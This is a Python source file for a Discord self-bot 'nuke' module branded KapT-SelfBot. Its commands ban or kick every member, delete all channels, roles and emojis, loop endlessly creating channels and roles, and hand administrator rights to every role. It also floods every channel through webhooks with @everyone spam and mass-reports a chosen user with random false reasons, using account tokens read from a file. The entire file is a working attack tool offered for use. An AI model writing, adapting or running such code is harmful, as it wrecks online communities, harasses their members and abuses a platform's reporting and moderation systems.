from asyncio import create_task
from datetime import datetime
import random
import time
import discord
from discord.ext import commands
from colorama import Fore
from prettytable import PrettyTable

from src.utils import MassThread, createchannel, createrole, killchannel, killrole, send_report, sendch

class NukeCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def banall(self, ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try: 
                await member.ban()
            except: pass

    @commands.command()
    async def kall(self, ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                await member.kick()
                print(f"{Fore.GREEN} Kicked {member}")
            except:
                print(f"{Fore.GREEN} Can't Kick {member}")
            continue


    @commands.command()
    async def schan(self, ctx, *, x):
        await ctx.message.delete()
        while True:
            await ctx.guild.create_text_channel(name=x)


    @commands.command()
    async def srole(self, ctx, *, x):
        await ctx.message.delete()
        while True:
            await ctx.guild.create_role(name=x)


    @commands.command()
    async def dchan(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"Deleted {channel}")
            except:
                print(f"Can't Delete {channel}")
                continue

    @commands.command()
    async def massreport(self, ctx, count = 10, member: discord.Member = None):
        if member: pass
        elif ctx.message.reference:
            try: 
                async for message in ctx.history():
                    if message.id == ctx.message.reference.message_id:
                        member = await ctx.guild.fetch_member(message.author)
                        break
            except: return await ctx.message.edit(content = "Failed to get target user.")
        else: return await ctx.message.edit(content = "Target user not specified! Reply to a message sent by the target user or provide it as a command argument (Usage: `.massreport [number] [@user]`).")
        await ctx.message.edit(content = f"Mass report {member.mention} started. Please wait...")
        start_time1 = round(time.time())
        start_time1_fmt = datetime.fromtimestamp(start_time1).strftime("%Y/%m/%d %H:%M:%S.%f")
        tokens_array = open("tokens.txt", "r").read().split("\n")
        log_table = PrettyTable(["№ report", "Report time", "Token number", "Reason", "Report status", "Channel ID", "Message ID"])
        log_table.sortby = "№ report"
        log_table.align = 'l'
        log_text = f'''**__Mass Reporter by KapT Self-Bot__
    Reporter start time: {start_time1_fmt} UTC
    Target user: {member.display_name}#{member.discriminator} ({member.id})
    Destination server: {member.guild.name} ({member.guild.id})
    Number of reports per user: {count}
    Number of reporter tokens: {len(tokens_array)}

    Some explanations:
    report number - serial number of the report
    Report time - the amount of time elapsed since the start of the reporter (this is the difference)
    token number - serial number of the reporter token that made the report
    Reason - random reason for the message report
    Report status - Successful or not
    Channel ID - Channel ID that was specified in this report
    Message ID - ID of the message that was specified in this report**'''
        collected_messages = []
        async for message in ctx.history(limit = 1000):
            if message.author == member:
                collected_messages.append(message.id)
        current_report = 1
        reason_dict = {
            "0": "Illegal content",
            "1": "Harrasment",
            "2": "Spam or phishing links",
            "3": "Self-harm",
            "4": "NSFW Content"
        }
        for _ in range(count):
            tkn = random.choice(tokens_array)
            msg = random.choice(collected_messages)
            rep = send_report(
                tkn,
                ctx.guild.id,
                ctx.channel.id,
                msg
            )
            if rep[0] == True:
                diff = round(time.time()) - start_time1
                if diff > 60: diffmins = diff / 60
                else: diffmins = 0
                diff = diff % 60
                if diff < 10: diff = f"0{diff}"
                log_table.add_row([
                        current_report,
                        f"+{diffmins}:{diff}",
                        tokens_array.index(tkn),
                        reason_dict[str(rep[1])],
                        "OK",
                        ctx.channel.id,
                        msg
                ])
            elif rep[0] == False:
                diff = round(time.time()) - start_time1
                if diff > 60: diffmins = diff / 60
                else: diffmins = 0
                diff = diff % 60
                if diff < 10: diff = f"0{diff}"
                log_table.add_row([
                        current_report,
                        f"+{diffmins}:{diff}",
                        tokens_array.index(tkn),
                        reason_dict[str(rep[1])],
                        "FAIL",
                        ctx.channel.id,
                        msg
                ])
            else:
                diff = round(time.time()) - start_time1
                if diff > 60: diffmins = diff / 60
                else: diffmins = 0
                diff = diff % 60
                if diff < 10: diff = f"0{diff}"
                log_table.add_row([
                        current_report,
                        f"+{diffmins}:{diff}",
                        tokens_array.index(tkn),
                        reason_dict[str(rep[1])],
                        rep[0],
                        ctx.channel.id,
                        msg
                ])
            current_report += 1
        log_filename = 'test'
        open(f"{log_filename}.txt", "w", encoding = 'utf-8').write(log_text + '\n\n' + log_table.get_string())
        await ctx.message.edit(content = f"The mass reporter has completed his work. {len(tokens_array)} tokens sent {current_report - 1} reports to {member.mention}.")
        try: await ctx.send(file = discord.File(f"{log_filename}.txt"))
        except: await ctx.send("Can't send log file.")


    @commands.command()
    async def drole(self, ctx):
        await ctx.message.delete()
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"Deleted {role}")
            except:
                print(f"Can't Delete {role}")
            continue


    @commands.command()
    async def roles(self, ctx):
        await ctx.message.delete()
        try:
            roles = [role for role in ctx.guild.roles[::-1]]
        except:
            await ctx.send("""**__Server Roles:__**\n""" +
                        "\n".join([role.name for role in roles]))

    @commands.command()
    async def fastauto(self, ctx):
        for rolee in ctx.guild.roles:
            create_task(killrole(ctx, role=rolee))
        for channel in ctx.guild.channels:
            create_task(killchannel(ctx, ch=channel))
        for _ in range(50):
            create_task(createchannel(ctx))
            create_task(createrole(ctx))

    @commands.command()
    async def auto(self, ctx):
        for a in ctx.guild.roles:
            try: await a.delete()
            except: pass
        for b in ctx.guild.channels:
            try: await b.delete()
            except: pass
        for c in ctx.guild.emojis:
            try: await c.delete()
            except: pass
        with open('crash.png', 'rb') as f:
            icon = f.read()
            try: await ctx.guild.edit(name="Crashed by KapT-SelfBot", icon=icon)
            except: pass
        for _ in range(50):
            try: await ctx.guild.create_text_channel(name="crash-by-KapT-SelfBot")
            except: pass
        for _ in range(50):
            try: await ctx.guild.create_role(name="Crashed by KapT-SelfBot")
            except: pass
        for member in ctx.guild.members:
            try: await member.ban()
            except: pass

    @commands.command()
    async def hookall(self, ctx):
        member=ctx.author
        whlist=[]
        for channel in ctx.guild.text_channels:
            if member.permissions_in(channel).manage_webhooks:
                webhoks = await channel.webhooks()
                if len(webhoks) > 0:
                    for webhook in webhoks:
                        whlist.append(webhook)
                else:
                    webhook = await channel.create_webhook(name="Crashed by KapT-SelfBot")
                    whlist.append(webhook)
        while True:
            for webhook in whlist:
                try: await webhook.send('''
    @everyone @here
    Crashed by KapT-SelfBot
    https://github.com/KapTaBka/KapT-Self-Bot
    https://t.me/kapt_self_bot
    ''', username = "Crashed by SelfBot-Kapt")
                except: pass


    @commands.command()
    async def spamall(self, ctx, kapt: int, *, lol):
        for channel in ctx.guild.text_channels:
            create_task(sendch(ctx, ch=channel, text=f'{lol}\n||{random.randint(1000, 9999)}||', count=kapt))

    @commands.command(pass_context=True)
    async def bypass_spam(self, ctx, lol: int, *, message):
        await ctx.message.delete()
        for _i in range(lol):
            await ctx.send(f'{message} ||{random.randint(1000, 9999)}||')

    @commands.command()
    async def dellall(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                pass
        for members in ctx.guild.members:
            try:
                await members.ban()
            except:
                pass

    @commands.command()
    async def anticrash(self, ctx):
        for role in ctx.guild.roles:
            try:
                await role.edit(name="Crashed by KapT-SelfBot", permissions=discord.Permissions(permissions=8))
            except:
                pass
            else:
                pass
        for channel in ctx.guild.channels:
            try:
                await channel.edit(name=f"Crashed by KapT-SelfBot-{random.randint(1, 1000)}", topic="Crashed by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot")
            except:
                pass
            else:
                pass
        for chan in ctx.guild.text_channels:
            try:
                hell = await chan.create_webhook(name='Crashed by KapT-SelfBot')
            except:
                pass
        for i in range(30):
            for channels in ctx.guild.text_channels:
                hooks = await channels.webhooks()
                for hook in hooks:
                    await hook.send('@everyone @here Crashed by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot https://t.me/kapt_self_bot')

    async def sendhook(ctx, channelm):
            for i in range(100):
                hooks = await channelm.webhooks()
                for hook in hooks:
                    await hook.send('@everyone @here Crash by KapT-SelfBot https://github.com/KapTaBka/KapT-Self-Bot https://t.me/kapt_self_bot!')

    @commands.command(pass_contextt=True)
    async def spam(self, ctx, amount: int, *, message):
        await ctx.message.delete()
        for _i in range(amount):
            await ctx.send(message)



    @commands.command()
    async def threadspam(self, ctx, maxamount: int = 10):
        try:
            await ctx.message.delete()
        except:
            pass
        threads = []
        for i in range(maxamount):
            thread = discord.Thread(target=MassThread, args=(
                ctx,
                maxamount,
            )).start()
            threads.append(thread)

def setup(bot):
    bot.add_cog(NukeCog(bot))